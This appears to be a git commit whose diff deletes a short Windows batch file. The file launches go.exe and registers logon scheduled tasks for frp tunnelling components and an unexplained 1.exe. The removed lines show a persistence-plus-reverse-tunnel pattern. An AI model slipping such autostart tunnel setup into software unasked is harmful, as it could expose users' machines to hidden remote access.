acf5780bcda7ac300dd099ac4b15e3146acafef9
cambo Guo <76270078+Skywalker2333@users.noreply.github.com>
2025-05-14 21:37:59 +0800

    Delete run1.bat

--- run1.bat
+++
@@ -1,5 +0,0 @@
-start "" "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--4\go.exe"
-schtasks /create /tn "a1" /tr "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--4\frpc.bat" /sc onlogon /ru "%USERNAME%" /f
-schtasks /create /tn "a2" /tr "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--4\1.exe" /sc onlogon /ru "%USERNAME%" /f
-schtasks /create /tn "a3" /tr "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--4\frp.exe" /sc onlogon /ru "%USERNAME%" /f
-exit
